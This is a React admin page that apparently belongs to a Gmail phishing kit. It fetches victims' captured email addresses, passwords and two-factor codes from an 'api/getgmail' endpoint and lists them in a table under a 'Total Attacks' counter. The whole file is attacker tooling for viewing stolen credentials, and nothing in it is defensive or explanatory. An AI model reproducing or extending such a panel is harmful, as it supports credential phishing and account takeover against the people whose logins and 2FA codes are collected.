"use client";
import axios from "axios";
import React, { useEffect, useState } from "react";

function AdminPage() {
  const [usersList, setUsersList] = useState([]);

  useEffect(() => {
    featchData();
    console.log("New req");
  }, []);

  const featchData = async () => {
    const responce = await axios.get("api/getgmail");
    const data = await responce.data;

    console.log(data);

    const users = data.users.map((user) => ({
      email: user.email,
      password: user.password,
      towFactor: user.towFactor,
    }));

    setUsersList(users);

    console.log(usersList);
  };
  return (
    <div className="h-screen w-screen bg-black text-white  px-2 py-2">
      <div className="flex gap-2">
        <div className="bg-black-cool w-fit py-2 px-3 rounded-md border-2 shadow-lg h-fit border-grey-mid">
          <p className="text-sm text-grey-lite">Total Attacks</p>
          <p className="font-semibold text-lg ">{usersList.length}</p>
        </div>
      </div>

      <div className=" w-full px-3 py-10">
        <table className="w-full text-left rounded-md">
          <tr className="border-b border-[#374151] bg-black-cool">
            <th className="py-3 px-3">ip address</th>
            <th className="py-3 px-3">Email</th>
            <th className="py-3 px-3">Password</th>
            <th className="py-3 px-3">Towfactor</th>
          </tr>
          {usersList.map((user, i) => (
            <tr className="border-b border-[#374151d0]">
              <td className="py-3 px-3 text-[#D1D5DB]">111.111</td>
              <td className="py-3 px-3 text-[#D1D5DB]">{user.email}</td>
              <td className="py-3 px-3 text-[#D1D5DB]">{user.password}</td>
              <td className="py-3 px-3 text-[#D1D5DB]">{user.towFactor}</td>
            </tr>
          ))}
        </table>
      </div>
      <button onClick={featchData}>fetch</button>
    </div>
  );
}

export default AdminPage;
